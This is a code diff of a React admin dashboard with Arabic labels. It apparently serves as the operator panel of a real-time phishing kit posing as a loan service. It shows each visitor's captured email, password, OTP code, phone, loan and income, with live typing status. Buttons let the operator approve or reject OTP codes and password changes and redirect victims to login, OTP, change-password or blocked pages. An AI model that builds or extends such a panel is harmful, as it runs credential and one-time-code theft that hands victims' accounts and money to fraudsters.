+                          <p className="truncate text-[10px] text-white/35" dir="ltr">{sub.email}</p>
+                        )}
+                      </div>
                     </div>
-                  ))}
+                    <div className="flex flex-col items-end gap-1 shrink-0">
+                      <span className="text-[9px] text-white/30 flex items-center gap-1">
+                        <Clock className="h-2.5 w-2.5" />{timeAgo}
+                      </span>
+                      {sub.isActive && (
+                        <span className="flex items-center gap-1 rounded-full bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">
+                          <span className="h-1.5 w-1.5 rounded-full bg-[#1fc28a] animate-pulse" />
+                          {T.connectedNow}
+                        </span>
+                      )}
+                    </div>
+                  </div>
+                  <div className="mt-2 flex flex-wrap items-center gap-1.5">
+                    {sub.page && (
+                      <span className={`rounded-[5px] px-1.5 py-0.5 text-[9px] font-bold ${pageColor[sub.page] ?? "bg-white/5 text-white/40"}`}>
+                        {sub.page}
+                      </span>
+                    )}
+                    {sub.otpCode && (
+                      <span className="rounded-[5px] bg-[#f5a623]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#f5a623]">
+                        OTP: {sub.otpCode}
+                      </span>
+                    )}
+                    {sub.otpStatus === "approved" && (
+                      <span className="rounded-[5px] bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">✓ {T.otpApproved}</span>
+                    )}
+                    {sub.otpStatus === "rejected" && (
+                      <span className="rounded-[5px] bg-[#e54343]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#e54343]">✗ {T.otpRejected}</span>
+                    )}
+                    {sub.changepassStatus === "approved" && (
+                      <span className="rounded-[5px] bg-[#1fc28a]/15 px-1.5 py-0.5 text-[9px] font-bold text-[#1fc28a]">✓ {T.passApproved}</span>
+                    )}
+                  </div>
+                </button>
+              );
+            })
+          )}
+        </div>
+      </div>
+
+      {/* LEFT PANEL — DETAILS */}
+      <div className={`flex-1 flex-col h-full overflow-y-auto ${selectedSub ? "flex" : "hidden sm:flex"}`}>
+        {!selectedSub ? (
+          <div className="flex h-full flex-col items-center justify-center text-center space-y-4">
+            <div className="h-16 w-16 rounded-full bg-[#1a2540] flex items-center justify-center">
+              <UserRound className="h-7 w-7 text-white/15" />
+            </div>
+            <p className="text-[14px] font-bold text-white/25">{T.selectVisitor}</p>
+            <p className="text-[12px] text-white/15">{T.selectVisitorSub}</p>
+          </div>
+        ) : (
+          <div className="h-full overflow-y-auto">
+
+            {/* Details Header */}
+            <div className="sticky top-0 z-10 border-b border-[#1e2a45] bg-[#0b1120]/95 backdrop-blur-sm px-5 pt-4 pb-3">
+              <div className="flex items-center justify-between gap-3">
+                <div className="flex items-center gap-3 min-w-0">
+                  <button onClick={() => setSelected(null)} className="sm:hidden rounded-[8px] bg-white/5 p-2 text-white/50 hover:bg-white/10">
+                    <X className="h-4 w-4" />
+                  </button>
+                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-[16px] font-extrabold
+                    ${selectedSub.isActive ? "bg-[#1fc28a]/20 text-[#1fc28a]" : "bg-[#657bd8]/15 text-[#657bd8]/70"}`}>
+                    {(selectedSub.phone || selectedSub.email || "؟").slice(0, 1).toUpperCase()}
+                  </div>
+                  <div className="min-w-0">
+                    <p className="text-[14px] font-extrabold text-white/90 truncate">
+                      {selectedSub.phone || selectedSub.email || selectedSub.id.slice(-10)}
+                    </p>
+                    <div className="flex items-center gap-1.5">
+                      <span className={`h-1.5 w-1.5 rounded-full ${selectedSub.isActive ? statusDot[liveStatus] : "bg-white/20"}`} />
+                      <span className={`text-[10px] font-semibold ${selectedSub.isActive ? statusColor[liveStatus] : "text-white/30"}`}>
+                        {selectedSub.isActive
+                          ? (liveStatus === "typing" ? T.statusTyping : liveStatus === "submitted" ? T.statusSubmitted : T.statusConnected)
+                          : T.statusDisconnected}
+                      </span>
+                      {selectedSub.page && (
+                        <span className={`rounded-full px-1.5 py-0.5 text-[9px] font-bold ${pageColor[selectedSub.page] ?? "bg-white/5 text-white/40"}`}>
+                          {selectedSub.page}
+                        </span>
+                      )}
+                    </div>
+                  </div>
                 </div>
 
-                {visitor.status !== "disconnected" && (
-                  <div className="pt-2 border-t border-white/[0.06] space-y-2">
-                    <p className="text-[9px] font-bold text-[#c9ccdb]/40 uppercase tracking-widest">{T.chooseRedirect}</p>
-                    <div className="grid grid-cols-3 gap-1.5">
+                {/* Redirect dropdown */}
+                <div className="relative shrink-0">
+                  <button onClick={() => setShowRedirect(!showRedirect)}
+                    className="flex items-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/30 px-3 py-2 text-[11px] font-bold text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors">
+                    <ArrowRightLeft className="h-3.5 w-3.5" />
+                    {T.redirectTo}
+                    <ChevronDown className="h-3 w-3" />
+                  </button>
+                  {showRedirect && (
+                    <div className={`absolute top-full mt-1 z-50 rounded-[12px] bg-[#131e35] border border-[#1e2a45] shadow-2xl overflow-hidden min-w-[180px] ${isRtl ? "left-0" : "right-0"}`}>
                       {[
-                        { target: "login", label: T.redirectLogin, color: "text-[#c9ccdb]", border: "border-white/10", bg: "bg-white/5 hover:bg-white/10", icon: <UserRound className="h-3.5 w-3.5" /> },
-                        { target: "otp", label: T.redirectOtp, color: "text-[#657bd8]", border: "border-[#657bd8]/30", bg: "bg-[#657bd8]/10 hover:bg-[#657bd8]/20", icon: <ShieldCheck className="h-3.5 w-3.5" /> },
-                        { target: "changepass", label: T.redirectChangepass, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30", bg: "bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20", icon: <KeyRound className="h-3.5 w-3.5" /> },
+                        { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3.5 w-3.5" />, color: "text-white/70" },
+                        { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3.5 w-3.5" />, color: "text-[#657bd8]" },
+                        { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3.5 w-3.5" />, color: "text-[#1fc28a]" },
+                        { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3.5 w-3.5" />, color: "text-[#e54343]" },
                       ].map((opt) => (
-                        <button
-                          key={opt.target}
-                          onClick={() => {
-                            localStorage.setItem("sham_admin_cmd", `redirect:${opt.target}`);
-                          }}
-                          className={`flex flex-col items-center gap-1 rounded-[9px] border ${opt.border} ${opt.bg} py-2 ${opt.color} transition-colors active:scale-95`}
-                        >
-                          {opt.icon}
-                          <span className="text-[9px] font-bold leading-tight text-center">{opt.label}</span>
+                        <button key={opt.cmd} onClick={() => { sendCmd(opt.cmd); setShowRedirect(false); }}
+                          className={`flex w-full items-center gap-2.5 px-4 py-3 text-[12px] font-semibold ${opt.color} hover:bg-white/5 transition-colors`}
+                          dir={isRtl ? "rtl" : "ltr"}>
+                          {opt.icon}{opt.label}
                         </button>
                       ))}
                     </div>
-                    <div className="grid grid-cols-2 gap-1.5">
-                      <button
-                        onClick={() => { localStorage.setItem("sham_admin_cmd", "redirect:changepass"); }}
-                        className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95"
-                      >
-                        <CheckCircle className="h-3.5 w-3.5" />
-                        <span className="text-[10px] font-bold">{T.approve}</span>
-                      </button>
-                      <button
-                        onClick={() => { localStorage.setItem("sham_admin_cmd", "redirect:blocked"); }}
-                        className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95"
-                      >
-                        <XCircle className="h-3.5 w-3.5" />
-                        <span className="text-[10px] font-bold">{T.reject}</span>
-                      </button>
-                    </div>
-                  </div>
+                  )}
+                </div>
+              </div>
+
+              {/* Quick info row */}
+              <div className="mt-3 flex flex-wrap items-center gap-2">
+                {selectedSub.submittedAt && (
+                  <span className="flex items-center gap-1 text-[10px] text-white/35">
+                    <Clock className="h-3 w-3" /> {selectedSub.submittedAt}
+                  </span>
                 )}
+                <span className="flex items-center gap-1 text-[10px] text-white/20">
+                  ID: {selectedSub.id.slice(-8)}
+                </span>
               </div>
             </div>
-          )}
 
-          {pending.length > 0 && (
-            <div className="space-y-2.5">
-              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.newRequests}</p>
-              {pending.map((req) => {
-                if (req.kind === "otp") {
-                  const r = req as OtpRequest;
-                  const showPicker = redirectPickerId === r.id;
-                  const vd = visitor?.data;
-                  return (
-                    <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#657bd8]/30 p-3 space-y-2.5 shadow-[0_6px_18px_rgba(101,123,216,0.1)]">
-                      <div className="flex items-start justify-between gap-2">
-                        <div className="space-y-0.5">
-                          <div className="flex items-center gap-1.5">
-                            <ShieldCheck className="h-3.5 w-3.5 text-[#657bd8]" />
-                            <span className="text-[11px] font-bold text-[#657bd8]">{T.otpVerify}</span>
-                          </div>
-                          <div className="flex items-center gap-1">
-                            <span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" />
-                            <span className="text-[10px] font-bold text-[#f5a623]">{T.awaitingDecision}</span>
-                          </div>
-                          <p className="text-[12px] font-extrabold text-white" dir="ltr">{r.phone}</p>
-                          <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
-                        </div>
-                        <div className="rounded-[8px] bg-[#2a3557] px-2.5 py-1.5 text-center shrink-0">
-                          <p className="text-[9px] text-[#c9ccdb]/50 mb-0.5">{T.otpCode}</p>
-                          <p className="text-[16px] font-extrabold text-white tracking-[0.1em]" dir="ltr">{r.code || "------"}</p>
-                        </div>
-                      </div>
+            <div className="space-y-3 p-5" onClick={() => setShowRedirect(false)}>
 
-                      <div className="rounded-[10px] bg-[#2a3557]/70 border border-white/[0.06] p-2.5 space-y-1.5">
-                        {[
-                          { label: T.email, value: vd?.email, icon: "✉️" },
-                          { label: T.phone, value: vd?.phone, icon: "📞" },
-                          { label: T.loan, value: vd?.loan ? `${vd.loan} ل.س` : "", icon: "💵" },
-                          { label: T.income, value: vd?.income ? `${vd.income} ل.س` : "", icon: "📈" },
-                        ].map((row) => (
-                          <div key={row.label} className="flex items-center justify-between gap-2 py-0.5 border-b border-white/[0.04] last:border-0">
-                            <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">
-                              <span className="text-[10px]">{row.icon}</span>{row.label}
-                            </span>
-                            <span className={`text-[11px] font-bold ${row.value ? "text-white/90" : "text-white/20"}`} dir="ltr">
-                              {row.value || "—"}
-                            </span>
-                          </div>
-                        ))}
-                      </div>
-
-                      {!showPicker ? (
-                        <div className="grid grid-cols-3 gap-1.5">
-                          <button onClick={() => decideOtp(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
-                            <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.approve}</span>
-                          </button>
-                          <button onClick={() => decideOtp(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
-                            <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.reject}</span>
-                          </button>
-                          <button onClick={() => setRedirectPickerId(r.id)} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#657bd8]/15 border border-[#657bd8]/30 py-2.5 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95">
-                            <ArrowRightLeft className="h-4 w-4" /><span className="text-[10px] font-bold">{T.redirect}</span>
-                          </button>
-                        </div>
-                      ) : (
-                        <div className="space-y-1.5">
-                          <div className="flex items-center justify-between mb-0.5">
-                            <p className="text-[11px] font-bold text-[#657bd8]">{T.chooseRedirect}</p>
-                            <button onClick={() => setRedirectPickerId(null)} className="text-white/40 hover:text-white/70"><X className="h-3.5 w-3.5" /></button>
-                          </div>
-                          {redirectOptions.map((opt) => (
-                            <button key={opt.value} onClick={() => redirectOtp(r.id, opt.value)}
-                              className={`w-full flex items-center gap-2.5 rounded-[10px] bg-[#2a3557] border ${opt.border} px-3 py-2.5 hover:bg-[#313f6a] transition-colors active:scale-[0.98]`}>
-                              <span className={opt.color}>{opt.icon}</span>
-                              <div className={isRtl ? "text-right" : "text-left"}>
-                                <p className={`text-[12px] font-bold ${opt.color}`}>{opt.label}</p>
-                                <p className="text-[10px] text-white/35">{opt.sub}</p>
-                              </div>
-                              <ArrowRightLeft className="h-3.5 w-3.5 text-white/20 mr-auto ml-auto" />
-                            </button>
-                          ))}
-                        </div>
-                      )}
-                    </div>
-                  );
-                }
-                const r = req as PassRequest;
-                return (
-                  <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#1fc28a]/20 p-3 space-y-3 shadow-[0_6px_18px_rgba(31,194,138,0.08)]">
-                    <div className="space-y-0.5">
-                      <div className="flex items-center gap-1.5"><KeyRound className="h-3.5 w-3.5 text-[#1fc28a]" /><span className="text-[11px] font-bold text-[#1fc28a]">{T.changePass}</span></div>
-                      <div className="flex items-center gap-1"><span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" /><span className="text-[10px] font-bold text-[#f5a623]">{T.awaitingApproval}</span></div>
-                      <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
-                    </div>
-                    <div className="grid grid-cols-2 gap-1.5">
-                      <button onClick={() => decidePass(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
-                        <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.approve}</span>
-                      </button>
-                      <button onClick={() => decidePass(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
-                        <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.reject}</span>
-                      </button>
-                    </div>
+              {/* OTP SECTION */}
+              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
+                <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
+                  <div className="flex items-center gap-2">
+                    <ShieldCheck className="h-4 w-4 text-[#657bd8]" />
+                    <span className="text-[12px] font-extrabold text-[#657bd8]">{T.otpSection}</span>
                   </div>
-                );
-              })}
-            </div>
-          )}
+                  {selectedSub.otpStatus && (
+                    <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
+                      ${selectedSub.otpStatus === "approved" ? "bg-[#1fc28a]/15 text-[#1fc28a]"
+                        : selectedSub.otpStatus === "rejected" ? "bg-[#e54343]/15 text-[#e54343]"
+                        : selectedSub.otpStatus === "redirected" ? "bg-[#657bd8]/15 text-[#657bd8]"
+                        : "bg-[#f5a623]/15 text-[#f5a623]"}`}>
+                      {selectedSub.otpStatus === "approved" ? T.otpApproved
+                        : selectedSub.otpStatus === "rejected" ? T.otpRejected
+                        : selectedSub.otpStatus === "redirected" ? T.otpRedirected
+                        : T.otpPending}
+                    </span>
+                  )}
+                </div>
+                <div className="p-4 space-y-3">
+                  {/* Credentials */}
+                  <div className="grid grid-cols-1 gap-2">
+                    {[
+                      { label: T.email, value: selectedSub.email, icon: <Mail className="h-3 w-3" />, dir: "ltr" },
+                      { label: T.password, value: selectedSub.password ? "••••••••" : T.notSubmitted, icon: <KeyRound className="h-3 w-3" />, dir: "ltr" },
+                      { label: T.otpCode, value: selectedSub.otpCode || T.waiting, icon: <ShieldCheck className="h-3 w-3" />, dir: "ltr", highlight: !!selectedSub.otpCode },
+                    ].map((row) => (
+                      <div key={row.label} className={`flex items-center justify-between rounded-[9px] px-3 py-2.5 ${row.highlight ? "bg-[#f5a623]/10 border border-[#f5a623]/20" : "bg-[#0d1526] border border-[#1e2a45]"}`}>
+                        <span className={`text-[10px] font-semibold flex items-center gap-1.5 ${row.highlight ? "text-[#f5a623]/70" : "text-white/35"}`}>
+                          {row.icon}{row.label}
+                        </span>
+                        <span className={`text-[12px] font-bold ${row.highlight ? "text-[#f5a623]" : row.value === T.waiting || row.value === T.notSubmitted ? "text-white/25" : "text-white/80"}`} dir={row.dir}>
+                          {row.value || "—"}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
 
-          {!visitor && pending.length === 0 && history.length === 0 && (
-            <div className="flex flex-col items-center justify-center py-16 space-y-3 text-center">
-              <div className="h-14 w-14 rounded-full bg-[#1e2640] flex items-center justify-center">
-                <Bell className="h-6 w-6 text-white/20" />
+                  {/* OTP Action Buttons */}
+                  {selectedSub.isActive && (
+                    <div className="space-y-2 pt-1">
+                      <p className="text-[9px] font-bold text-white/25 uppercase tracking-widest">أوامر OTP</p>
+                      <div className="grid grid-cols-2 gap-2">
+                        <button onClick={() => decideOtp("approved")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
+                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
+                        </button>
+                        <button onClick={() => decideOtp("rejected")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
+                          <XCircle className="h-3.5 w-3.5" />{T.reject}
+                        </button>
+                      </div>
+                      <div className="grid grid-cols-2 gap-2">
+                        <button onClick={() => sendCmd("redirect:otp")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#657bd8]/15 border border-[#657bd8]/20 py-2 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95 text-[10px] font-bold">
+                          <Send className="h-3 w-3" />{T.sendToOtp}
+                        </button>
+                        <button onClick={() => sendCmd("redirect:changepass")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/10 border border-[#1fc28a]/15 py-2 text-[#1fc28a]/70 hover:bg-[#1fc28a]/20 transition-colors active:scale-95 text-[10px] font-bold">
+                          <RefreshCw className="h-3 w-3" />{T.sendToChangepass}
+                        </button>
+                      </div>
+                    </div>
+                  )}
+                </div>
               </div>
-              <p className="text-[13px] font-bold text-white/30">{T.noRequests}</p>
-              <p className="text-[11px] text-white/20">{T.noRequestsSub}</p>
-            </div>
-          )}
 
-          {history.length > 0 && (
-            <div className="space-y-2">
-              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.history}</p>
-              {history.map((req) => {
-                const labelMap = req.kind === "otp" ? otpStatusLabel : passStatusLabel;
-                const s = labelMap[req.status];
-                return (
-                  <div key={req.id} className="rounded-[12px] bg-[#1a2035] border border-white/[0.04] p-3 flex items-center justify-between gap-2">
-                    <div className="space-y-0.5">
-                      <div className="flex items-center gap-1">
-                        {req.kind === "otp" ? <ShieldCheck className="h-3 w-3 text-[#657bd8]" /> : <KeyRound className="h-3 w-3 text-[#1fc28a]" />}
-                        <p className="text-[11px] font-bold text-white/70">{req.kind === "otp" ? T.otpHistory : T.changePassHistory}</p>
-                      </div>
-                      {req.kind === "otp" && <p className="text-[10px] text-white/35" dir="ltr">{(req as OtpRequest).phone}</p>}
-                      <p className="text-[10px] text-[#c9ccdb]/35 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{req.time}</p>
+              {/* BASIC INFO */}
+              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
+                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
+                  <UserRound className="h-4 w-4 text-white/40" />
+                  <span className="text-[12px] font-extrabold text-white/60">{T.basicInfo}</span>
+                </div>
+                <div className="p-4 space-y-2">
+                  {[
+                    { label: T.phone, value: selectedSub.phone, icon: <Phone className="h-3 w-3" />, dir: "ltr" },
+                    { label: T.submittedTime, value: selectedSub.submittedAt, icon: <Clock className="h-3 w-3" />, dir: "ltr" },
+                    { label: T.page, value: selectedSub.page, icon: <MapPin className="h-3 w-3" />, dir: isRtl ? "rtl" : "ltr" },
+                  ].map((row) => (
+                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
+                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
+                      <span className={`text-[12px] font-bold ${row.value ? "text-white/80" : "text-white/20"}`} dir={row.dir}>{row.value || "—"}</span>
                     </div>
-                    {s && <span className={`rounded-[6px] px-2.5 py-1 text-[10px] font-bold ${s.color} ${s.bg}`}>{s.label}</span>}
+                  ))}
+                </div>
+              </div>
+
+              {/* LOAN DETAILS */}
+              <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
+                <div className="flex items-center gap-2 border-b border-[#1e2a45] px-4 py-2.5">
+                  <DollarSign className="h-4 w-4 text-[#1fc28a]/60" />
+                  <span className="text-[12px] font-extrabold text-[#1fc28a]/60">{T.loanInfo}</span>
+                </div>
+                <div className="p-4 space-y-2">
+                  {[
+                    { label: T.loan, value: selectedSub.loan ? `${selectedSub.loan} ل.س` : "", icon: <DollarSign className="h-3 w-3" /> },
+                    { label: T.income, value: selectedSub.income ? `${selectedSub.income} ل.س` : "", icon: <TrendingUp className="h-3 w-3" /> },
+                  ].map((row) => (
+                    <div key={row.label} className="flex items-center justify-between rounded-[9px] bg-[#0d1526] border border-[#1e2a45] px-3 py-2.5">
+                      <span className="text-[10px] font-semibold text-white/35 flex items-center gap-1.5">{row.icon}{row.label}</span>
+                      <span className={`text-[12px] font-bold ${row.value ? "text-[#1fc28a]" : "text-white/20"}`} dir="ltr">{row.value || "—"}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              {/* CHANGE PASSWORD */}
+              {(selectedSub.changepassStatus || selectedSub.isActive) && (
+                <div className="rounded-[14px] border border-[#1e2a45] bg-[#121d35] overflow-hidden">
+                  <div className="flex items-center justify-between border-b border-[#1e2a45] px-4 py-2.5">
+                    <div className="flex items-center gap-2">
+                      <KeyRound className="h-4 w-4 text-[#1fc28a]/60" />
+                      <span className="text-[12px] font-extrabold text-[#1fc28a]/60">تغيير كلمة المرور</span>
+                    </div>
+                    {selectedSub.changepassStatus && (
+                      <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold
+                        ${selectedSub.changepassStatus === "approved" ? "bg-[#1fc28a]/15 text-[#1fc28a]"
+                          : selectedSub.changepassStatus === "rejected" ? "bg-[#e54343]/15 text-[#e54343]"
+                          : "bg-[#f5a623]/15 text-[#f5a623]"}`}>
+                        {selectedSub.changepassStatus === "approved" ? T.passApproved
+                          : selectedSub.changepassStatus === "rejected" ? T.passRejected
+                          : T.passPending}
+                      </span>
+                    )}
                   </div>
-                );
-              })}
+                  {selectedSub.isActive && (
+                    <div className="p-4">
+                      <div className="grid grid-cols-2 gap-2">
+                        <button onClick={() => decidePass("approved")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95 text-[11px] font-bold">
+                          <CheckCircle className="h-3.5 w-3.5" />{T.approve}
+                        </button>
+                        <button onClick={() => decidePass("rejected")}
+                          className="flex items-center justify-center gap-1.5 rounded-[9px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95 text-[11px] font-bold">
+                          <XCircle className="h-3.5 w-3.5" />{T.reject}
+                        </button>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {/* REDIRECT ACTIONS */}
+              {selectedSub.isActive && (
+                <div className="rounded-[14px] border border-[#657bd8]/20 bg-[#657bd8]/5 p-4 space-y-2">
+                  <p className="text-[10px] font-bold text-[#657bd8]/60 uppercase tracking-widest flex items-center gap-1.5">
+                    <ArrowRightLeft className="h-3 w-3" />{T.redirectTo}
+                  </p>
+                  <div className="grid grid-cols-2 gap-2">
+                    {[
+                      { cmd: "redirect:login", label: T.redirectLogin, icon: <UserRound className="h-3 w-3" />, color: "text-white/60 border-white/10 bg-white/5 hover:bg-white/10" },
+                      { cmd: "redirect:otp", label: T.redirectOtp, icon: <ShieldCheck className="h-3 w-3" />, color: "text-[#657bd8] border-[#657bd8]/20 bg-[#657bd8]/10 hover:bg-[#657bd8]/20" },
+                      { cmd: "redirect:changepass", label: T.redirectChangepass, icon: <KeyRound className="h-3 w-3" />, color: "text-[#1fc28a] border-[#1fc28a]/20 bg-[#1fc28a]/10 hover:bg-[#1fc28a]/20" },
+                      { cmd: "redirect:blocked", label: T.redirectBlocked, icon: <XCircle className="h-3 w-3" />, color: "text-[#e54343] border-[#e54343]/20 bg-[#e54343]/10 hover:bg-[#e54343]/20" },
+                    ].map((opt) => (
+                      <button key={opt.cmd} onClick={() => sendCmd(opt.cmd)}
+                        className={`flex items-center justify-center gap-1.5 rounded-[9px] border py-2.5 transition-colors active:scale-95 text-[10px] font-bold ${opt.color}`}>
+                        {opt.icon}
+                        <span className="truncate">{opt.label}</span>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              )}
+
             </div>
-          )}
-        </div>
+          </div>
+        )}
       </div>
     </div>
   );
